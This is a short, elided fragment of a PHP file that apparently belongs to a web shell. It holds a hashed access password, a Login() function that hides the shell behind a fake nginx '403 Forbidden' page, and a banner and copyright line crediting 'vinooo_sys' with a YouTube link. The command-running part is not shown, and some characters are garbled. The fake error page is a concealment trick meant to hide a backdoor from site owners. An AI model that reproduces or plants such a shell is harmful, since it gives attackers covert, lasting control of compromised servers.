<?php
$auth_pass = "b20ae322ef6912b21c7cb24aafd520bb119d5e0b41b0a5f51fa22430f214b536";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache 403 ./nginx) </center>
...
<center>
<?php
echo '<font face="Bungee" size="5">ðrevision vinooo_sysð</font>
</center>
...
function author() {
    echo "<center><br>ðcopyright by vinooo_sysð<br><a href='https://youtu.be/kmvHFzIF1y8?si=cVH00ZnsGA4szU_2' target='_blank'>You Tube Gratis</a></center>";
    die();
}
